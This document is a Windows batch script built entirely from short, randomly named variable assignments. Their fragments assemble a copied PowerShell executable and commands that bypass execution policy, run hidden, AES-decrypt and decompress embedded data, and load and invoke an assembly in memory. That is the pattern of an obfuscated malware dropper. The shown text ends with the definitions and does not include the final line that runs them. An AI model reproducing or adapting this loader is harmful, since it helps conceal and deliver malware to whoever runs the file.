@echo off
set "QUmVLzhEow= C"
set "qtRAvBpmia=co"
set "nTDEzEMrKo=xe"
set "mOECkQNaOg=rs"
set "xTXizKGmnD=ll"
set "fhkMKyxXep=ll"
set "vyWmzyidTp=Wi"
set "uKXMhPXPHS=ow"
set "whBBFpYYPK=32"
set "HnfxpUuKVZ=we"
set "jTvwgrYZvn=s\"
set "LzIGvUsdqB=he"
set "vfwJKTJuRm=\v"
set "LtXxJotzBW=rS"
set "YPcJVtRvcA= /"
set "gmLIzFityC=py"
set "RvvmBbTsLk=po"
set "eEswUDikMk=0\"
set "BKDdsJstPv=\W"
set "LPatYcRSbL=.e"
set "zwdcKvhWOV=nd"
set "vHqThsYZvr=do"
set "gqbweNPPsy=he"
set "TrpVaHwpXb=:\"
set "jBNlvVyoIs=y "
set "qeLZXwnmlE=Sy"
set "duYfjrSskt=we"
set "nHRABInQOJ=Po"
set "pNpRCrlItC=1."
set "AzAbHLAkfK=st"
set "MCvujPPsIw=ws"
set "AtvagFbGWs=em"
set "ROUKMWIKSr=in"
set "KHZHNrLJuX= %~dp0"
set "GjMgipVfBM=cd"
set "LLHipdSjwX='[-1"
set "UkhvvNXwws= = N"
set "ldnSJCTZUS=gth)"
set "nTzdigLobI=ke.T"
set "HTjIVnjXCh=ewLi"
set "QnPMLtYzMp=]::N"
set "GBfkiWvwbx=.Cry"
set "rhbfWrWdKe=gMod"
set "SAxGQuRzEE='txe"
set "sIQXYFPrGK=.Sec"
set "JjLuycSZiO=ert]"
set "kofENNUUKr=ck($"
set "HgWQWCymNw=$KKf"
set "AKDWGglMRK=m.IO"
set "lyTvnnmhcz=in $"
set "RzPFrSkYoh=pose"
set "HWOKRgdmRH=Xke."
set "kVUpoyPNvn=.Cop"
set "TThNJXXZzp=.Key"
set "cGEYTzNxvr=Xke "
set "zWpbHgWDCT=nwmJ"
set "LAAKVAavhn=();$"
set "ySKNRSQcGs=tS46"
set "VbAwNgkyLS=le  "
set "HySFLuVbsJ=pres"
set "LKzmcVXtju=Bmor"
set "GcaboyaVYm= [st"
set "XtMqhiLgNC=ddin"
set "ESrUtyLeRa= = $"
set "TiTCsnnDHb=grap"
set "fGMcZjfGvW=lit("
set "SZcSJpvisQ=l5E7"
set "ouAryqbxKD=[]] "
set "huvdCPBVCG=PCEA"
set "qZNzCigsUy=nG.D"
set "bDlezrqsMR=Invo"
set "ITBHmyugJw=:('g"
set "JfUyowVbtk=F'[-"
set "HVMllPzFbA=Mode"
set "neeocVGkHp=g = "
set "lWHDxFbhoB=ring"
set "EYkXqjBndL=ion."
set "QhITdmNQwu=bghY"
set "erMaVnxQXc=]::C"
set "pBqrMopDaD=);$A"
set "qoKOQewuuk=tem."
set "obBfzUcdbO=yste"
set "YbfLhhMhLI=rt]:"
set "HvKMrYbJxL=ment"
set "BHMUMztSWn=comp"
set "rTYIVDmuOy=wq, "
set "GVMTUlbTOR=; };"
set "XiOGCsITcU='')("
set "poinTkLENW=tion"
set "mqauynRowV=m.IO"
set "zbWjAruPcy=1] -"
set "jovPOLikKN=bjec"
set "YVGCzgvYRI=m = "
set "zckldVWAGV=ew-O"
set "VaTnsDiuFt=tryP"
set "YQhewwYQlP=Conv"
set "oxTBfBCncs=6] -"
set "hEJzomAXqX=n ''"
set "acGArKurCs= = $"
set "qLADqZsZJt=.IO."
set "KUeRKMNXgM=ss -"
set "ZdPihDVwZn=cm);"
set "xrwsLsgjQU=Stre"
set "ZzjGxJCvAN=BC;$"
set "TuufXtCQGS=m, 0"
set "dBUisQSqWV=::De"
set "EDefbCsFPo=Uwq."
set "tdVgBmjEPo=sD ="
set "WfhxXdGcJC=6esa"
set "bUNUwBZSLh=ay()"
set "OntUThqFsc=-nop"
set "RxpuqsiwkE=tem."
set "kbmqiNByQQ=IUUw"
set "hBirUSGLUO=nQsD"
set "mQMemLWZEH=sD);"
set "WiidgqnNzo=oryS"
set "FInutUzMtj=O) {"
set "dqlGfWjGrj=eMVs"
set "bKnGLZSCVF=q = "
set "ewnApcwaGv=TllA"
set "yHhnycnmrf=ZzBw"
set "QEjjfbqpOU=qTtW"
set "neMbSkCAXv=ke($"
set "qFvDHEORDI=ode]"
set "QKZOtgExLr=();$"
set "ZzjDYtaOaf=-Obj"
set "PdhqNaBtxJ=($bg"
set "nfpdPKNLLO=n ''"
set "YOzwlLTIXJ=ionM"
set "pOLwJpJEzj=oL'["
set "zgsqLVmetO=zuZI"
set "sOTYjQmzxD=Obje"
set "OKAFQGkAuH=TYLc"
set "jNkeYXCtYE=PxEW"
set "jBScuHLFcW=YLcm"
set "HwHbFhLLmB=..-1"
set "lDjcZHvees='0Pg"
set "MxFmcoSgdO=('Tg"
set "QWJEVNEOYI=$IUU"
set "nPcArTmLBt=rofi"
set "TaXgrUVamu=-ep "
set "FPUWeerqHW=);$H"
set "kErXAVzQoV=();$"
set "CpVqOETecw= '')"
set "NCejIcRXkl=pStr"
set "spRgCehYaX=ateD"
set "kqWQZWIBDD=ZzBw"
set "NYmRkjnHNO=hYA "
set "UHlFwbgnyP=s75K"
set "qdHUHPhHuL=V.En"
set "JNYwAmCKqI=nage"
set "yqezoKsTOq=yTo("
set "BiGvvACWEf=rity"
set "hsNLNRlJjB=-joi"
set "gLIJMnGyYH=:: '"
set "iWxWfwBrqp=.Com"
set "AEYZlWvhaN=hy.A"
set "dPUgDUsBNb=em.C"
set "ufLFuzdAHw=$AZz"
set "vvnIWlchER=y.Cr"
set "FXNVKzWlFK=File"
set "BJmkXQDjLg=y.Ci"
set "noDtQfMmxi===')"
set "EdFjVnjHuL=New-"
set "XhWFiwpzRM=)))"
set "uApavfnasS=Disp"
set "HvTvxnAWuH=, $T"
set "fsdUExvWUU= [Sy"
set "ftHmcVMyNe=nwmJ"
set "aBsHEQTaHu=.Len"
set "ExUIXkCaUh=106u"
set "rItTdWCpdV=Secu"
set "jyQxNhIpsq=raph"
set "dbUyLmckUz=('da"
set "KeGoSRSzoV=Comp"
set "yqMFTggdnL=[Env"
set "MvByiMJOYX=ecry"
set "lvEJxKnwdX=O.Me"
set "oonnrSPBib= = ["
set "FeNqbHDZnC=ispo"
set "IoxRpurxpA=-joi"
set "qwRPLcrYEp=[Sys"
set "WKaVSDIVMY=ptog"
set "OfyaCiZygn=.Con"
set "KZNoiQBcUs=oint"
set "CQhrkKnYff=orF'"
set "NyOJzBIaph== [S"
set "vvVMIWRmRC=sD.T"
set "FuNCFsowXv=ing("
set "xiLCtGWbYh=AZzB"
set "GIXGFkEOOk=[-1."
set "ZBZifpTvyq=yste"
set "SCvjIptjaV=ddin"
set "bMYDuHJFzq=.Cre"
set "vBAeCQWqiz=vert"
set "ZtlwCpjwSi=ZzBw"
set "DZlBEWcCFB=]::("
set "CDnNlrBsKp=;$tT"
set "lUXSnryEDw=  $u"
set "NzowYuyKsd=7;$A"
set "HsHTamvevW=ZzBw"
set "JxVpqFaDCK=CFxo"
set "WRUAinRWix=comm"
set "UTAjGocfYk=join"
set "mScgLPFIvL=m.Re"
set "EqwjYknjfg=);$b"
set "akVqUXLKsi=stem"
set "ekWqohqgrZ=gnir"
set "RZgjiZWgvE=$qTt"
set "YPLvocGZnV=ne);"
set "thbbJHcPmx=pose"
set "sghheCXONy=3); "
set "tlyjtMvJhF=flec"
set "EUPgRVmQrt=;$tT"
set "BEnbSrkLcA= if "
set "UQnwTmSThg=Secu"
set "myWnNGPAsJ=cm ="
set "DHNPhwUHnC=esMa"
set "TIWIKWvIFL=);$A"
set "NurXSiPcLj=($bg"
set "KKeFvOWxuq=).Sp"
set "xdZBUrlLmc=ress"
set "DxwzbwRcZb=.Dis"
set "AoOhFcBdke=nirt"
set "NjxIraLMZS=trea"
set "OLKjtxoEwm=ose("
set "SCMchISBQh=KfnG"
set "zAZFsQiXTI=form"
set "PbUChUsJpm=A.Su"
set "exFCVgcLdg=fore"
set "CzPpuhoPkU=y.Pa"
set "GmbIoTwqXl=stem"
set "YNvsgczHuv=TYLc"
set "MsfroghAdi=.Mem"
set "icUYQXJOnA=y]::"
set "JbOOzpXPyt=rans"
set "bPAzJYMXoK=am;$"
set "XmzhXQMDcQ=and "
set "CGBhuevDus=Fina"
set "aAfIErzYYu=daeR"
set "QlUSpTBjwx=ptor"
set "piWhHVWjRs=m(, "
set "frDxAqFFHM=sion"
set "QhBcOViJGV=ect "
set "rLhxfgxscu=ct S"
set "VDXnQGBbAO=::('"
set "BMhZbaodyR=Syst"
set "ZSNBoIuoQO=)($T"
set "hYgVtEQTPm=V = "
set "PQbAiHSeJa=raph"
set "uybrlTTsih=em.I"
set "wfpXuXolsB=bypa"
set "NBZTSdiWoh=$TYL"
set "QyHuzoCpWx=YxVw"
set "hkPesCWDQq=saBm"
set "sFperMGByZ=.Mod"
set "ribSutDczP=bstr"
set "SKxspWuMSB=;$HP"
set "luumQVsCXc=gsYZ"
set "SOySTltNZd= New"
set "LtniNWmkxs=-1.."
set "fcOEJIgQzK=brea"
set "nTpiYmnKQd=Comp"
set "OMdUPzmiyh=oin "
set "DNXRxNxFZF=CEA."
set "rGWDNndmCd=;$IU"
set "qXhkcitnKM=w.Pa"
set "uTTeGddcdJ=.GZi"
set "ESjrSFXaBO=)($u"
set "TYSSjCkzct=hYA."
set "wOpaJDGiTX=$TYL"
set "KNfTbvHTBj=ress"
set "llefDODnNI=ZzBw"
set "ZhjnpUwHXK=.Ass"
set "ciMcgZikDN=ose("
set "oFRYSkpVKx= [Sy"
set "XQuiBeAgeq='[-1"
set "OqSsjjXQxj=KULs"
set "reYhwZwAcn=e]::"
set "SpYjotBlxv=New-"
set "uLQrPfglzj=e = "
set "wykdPWXROK=onve"
set "YzZlIYJGQc=Disp"
set "ZYmnlXjZtG=stem"
set "InjidxrWXE==');"
set "ylPwuAjuVz=ptog"
set "DuBXbfbdBV=gjYA"
set "kkthFRsZwP=eam("
set "FcOBuQSKZe=$bnQ"
set "OspgIzgXFS=se()"
set "trHLvGVIrH=Syst"
set "RFmohkqpBk=tsWi"
set "CiReudzIGE=ypto"
set "aiBoSGFKPP=ct S"
set "ltjbGGdHPx=PKCS"
set "YylNvxIWCB=[Sys"
set "QMBylZtqxY=.Cry"
set "kHuwGUfgSB=-4] "
set "jmofzLiNtB=LsV "
set "bvjQJUYlYf=G = "
set "uuBkTNmavl=$bnQ"
set "syFuEJrXHC=KKfn"
set "OkhopqyJOc=.-16"
set "vgXiZAjMdx=lBlo"
set "GQpTgwTreu=);$K"
set "FAMRfUjRoS== $A"
set "GvWqHbToTy=join"
set "jDLXBwWwTt=YLcm"
set "ljsGgXpxuQ=;$KU"
set "kzDhVihRwJ='gni"
set "sxqOkhUXhC=TYLc"
set "QzuhbCMOOT=..-1"
